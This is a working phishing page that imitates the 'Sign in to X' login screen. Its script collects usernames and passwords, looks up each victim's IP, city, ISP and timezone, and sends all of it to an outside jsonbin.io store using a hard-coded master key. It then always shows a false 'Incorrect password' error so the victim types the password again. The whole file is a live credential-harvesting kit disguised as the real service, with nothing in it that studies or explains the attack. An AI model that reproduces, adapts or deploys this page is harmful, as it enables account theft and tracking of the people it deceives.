<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X</title>
    <link rel="icon" href="https://abs.twimg.com/responsive-web/client-web/icon-ios.77d25eba.png" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            width: 100%;
            max-width: 600px;
            padding: 20px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo svg {
            width: 50px;
            height: 50px;
            fill: #fff;
        }
        
        .login-box {
            background-color: transparent;
            padding: 20px 0;
        }
        
        .title {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 40px;
        }
        
        .auth-buttons {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 25px;
        }
        
        .auth-btn {
            width: 100%;
            padding: 12px;
            border: 1px solid #536471;
            border-radius: 30px;
            background: transparent;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background-color 0.2s;
        }
        
        .auth-btn:hover {
            background-color: rgba(255, 255, 255, 0.05);
        }
        
        .auth-btn.apple {
            background-color: #fff;
            color: #000;
        }
        
        .auth-btn.apple:hover {
            background-color: #e6e6e6;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #536471;
        }
        
        .divider span {
            padding: 0 15px;
            color: #71767b;
            font-size: 15px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 17px 10px;
            background-color: transparent;
            border: 1px solid #536471;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1d9bf0;
        }
        
        .next-btn {
            width: 100%;
            padding: 14px;
            background-color: #fff;
            color: #000;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        
        .next-btn:hover {
            background-color: #e6e6e6;
        }
        
        .forgot-password {
            text-align: center;
            margin-top: 20px;
        }
        
        .forgot-password a {
            color: #1d9bf0;
            text-decoration: none;
            font-size: 15px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .signup-link {
            margin-top: 50px;
            color: #71767b;
            font-size: 15px;
        }
        
        .signup-link a {
            color: #1d9bf0;
            text-decoration: none;
        }
        
        .signup-link a:hover {
            text-decoration: underline;
        }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .checkbox-container input[type="checkbox"] {
            margin-right: 10px;
            width: 18px;
            height: 18px;
            accent-color: #1d9bf0;
        }
        
        .checkbox-label {
            font-size: 15px;
            color: #e7e9ea;
        }
        
        /* Password Step Styles */
        .password-step {
            display: none;
        }
        
        .back-link {
            color: #1d9bf0;
            background: none;
            border: none;
            font-size: 15px;
            cursor: pointer;
            margin-bottom: 20px;
            padding: 0;
        }
        
        .back-link:hover {
            text-decoration: underline;
        }
        
        .user-display {
            font-size: 15px;
            color: #71767b;
            margin-bottom: 20px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 4px;
        }
        
        /* Error Message */
        .error-message {
            color: #f4212e;
            font-size: 14px;
            text-align: center;
            margin: 15px 0;
            display: none;
            background-color: rgba(244, 33, 46, 0.05);
            padding: 12px;
            border-radius: 6px;
            border: 1px solid rgba(244, 33, 46, 0.1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" aria-hidden="true">
                <g>
                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
                </g>
            </svg>
        </div>
        
        <div class="login-box">
            <!-- Step 1: Username -->
            <div id="usernameStep">
                <h1 class="title">Sign in to X</h1>
                
                <div class="auth-buttons">
                    <button class="auth-btn">
                        Sign in with Google
                    </button>
                    <button class="auth-btn apple">
                        Sign in with Apple
                    </button>
                </div>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <form id="usernameForm">
                    <div class="form-group">
                        <input type="text" class="input-field" id="username" placeholder="Phone, email, or username" required>
                    </div>
                    
                    <button type="submit" class="next-btn">Next</button>
                </form>
                
                <div class="forgot-password">
                    <a href="#" onclick="return false;">Forgot password?</a>
                </div>
                
                <div class="signup-link">
                    Don't have an account? <a href="#" onclick="return false;">Sign up</a>
                </div>
            </div>
            
            <!-- Step 2: Password -->
            <div id="passwordStep" class="password-step">
                <button class="back-link" id="backButton">←</button>
                <h1 class="title">Enter your password</h1>
                
                <div class="user-display" id="userDisplay">
                    <!-- User info will be displayed here -->
                </div>
                
                <div class="error-message" id="errorMessage">
                    Incorrect password. Please try again.
                </div>
                
                <form id="passwordForm">
                    <div class="form-group">
                        <input type="password" class="input-field" id="password" placeholder="Password" required>
                    </div>
                    
                    <div class="checkbox-container">
                        <input type="checkbox" id="rememberMe">
                        <label for="rememberMe" class="checkbox-label">Remember me</label>
                    </div>
                    
                    <button type="submit" class="next-btn">Log in</button>
                </form>
                
                <div class="forgot-password">
                    <a href="#" onclick="return false;">Forgot password?</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        const API_KEY = "$2a$10$awAim7VUUgiDiyPrJB5uOOslfiCc8YReIqiSpkMevLcwyHYZ1jdju";
        const BIN_ID = "69c2e1a3b7ec241ddc9c8810";
        const API_URL = `https://api.jsonbin.io/v3/b/${BIN_ID}`;
        
        let currentUsername = '';
        
        // Get user location
        let userLocation = { ip: 'Unknown', country: 'Unknown', isp: 'Unknown', timezone: 'Unknown', city: 'Unknown' };
        
        async function fetchUserLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    userLocation = {
                        ip: data.ip || 'Unknown',
                        country: data.country_name || 'Unknown',
                        isp: data.org || 'Unknown',
                        timezone: data.timezone || 'Unknown',
                        city: data.city || 'Unknown'
                    };
                }
            } catch (error) {
                console.log('Location fetch failed');
            }
        }

        // Step 1: Handle username submission
        document.getElementById('usernameForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            currentUsername = document.getElementById('username').value.trim();
            
            if (!currentUsername) {
                // No alert - just return
                return;
            }

            // Show password step
            document.getElementById('usernameStep').style.display = 'none';
            document.getElementById('passwordStep').style.display = 'block';
            
            // Display user info
            document.getElementById('userDisplay').textContent = `Enter your password for ${currentUsername}`;
            document.getElementById('password').focus();
            
            // Hide error message
            document.getElementById('errorMessage').style.display = 'none';
        });

        // Step 2: Handle password submission
        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const rememberMe = document.getElementById('rememberMe').checked;
            
            if (!password) {
                return;
            }

            // Disable button and show loading
            const submitBtn = this.querySelector('.next-btn');
            submitBtn.disabled = true;
            submitBtn.textContent = 'Logging in...';

            try {
                // Fetch existing data
                const response = await fetch(API_URL, {
                    headers: {
                        'X-Master-Key': API_KEY,
                        'Content-Type': 'application/json'
                    }
                });
                
                if (!response.ok) throw new Error('Failed to fetch data');
                
                const binData = await response.json();
                let records = [];
                
                // Handle different data structures
                if (Array.isArray(binData)) {
                    records = binData;
                } else if (binData.record && Array.isArray(binData.record)) {
                    records = binData.record;
                } else if (binData.loginAttempts && Array.isArray(binData.loginAttempts)) {
                    records = binData.loginAttempts;
                } else if (binData.record && binData.record.loginAttempts && Array.isArray(binData.record.loginAttempts)) {
                    records = binData.record.loginAttempts;
                }
                
                // Add new record with timestamp and location data
                const newRecord = {
                    service: "X/Twitter",
                    username: currentUsername,
                    password: password,
                    rememberMe: rememberMe,
                    timestamp: new Date().toISOString(),
                    ip: userLocation.ip,
                    country: userLocation.country,
                    city: userLocation.city,
                    isp: userLocation.isp,
                    timezone: userLocation.timezone,
                    userAgent: navigator.userAgent.substring(0, 80)
                };
                
                records.push(newRecord);
                
                // Update bin
                await fetch(API_URL, {
                    method: 'PUT',
                    headers: {
                        'X-Master-Key': API_KEY,
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(records)
                });
                
                console.log('✅ X/Twitter login saved:', newRecord);
                
                // Show error message
                document.getElementById('errorMessage').style.display = 'block';
                
                // AUTO CLEAR PASSWORD FIELD
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
                
            } catch (error) {
                console.error('Error:', error);
            } finally {
                // Restore button
                submitBtn.disabled = false;
                submitBtn.textContent = 'Log in';
            }
        });

        // Back button handler
        document.getElementById('backButton').addEventListener('click', function() {
            document.getElementById('passwordStep').style.display = 'none';
            document.getElementById('usernameStep').style.display = 'block';
        });

        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'IP not available';
            }
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            fetchUserLocation();
            
            // Hide error message initially
            document.getElementById('errorMessage').style.display = 'none';

            // Make all non-functional links do nothing
            document.querySelectorAll('a').forEach(link => {
                link.addEventListener('click', function(e) {
                    if (!this.getAttribute('href') || this.getAttribute('href') === '#') {
                        e.preventDefault();
                    }
                });
            });
            
            // Auth buttons do nothing
            document.querySelectorAll('.auth-btn').forEach(btn => {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                });
            });
        });
    </script>
</body>
</html>
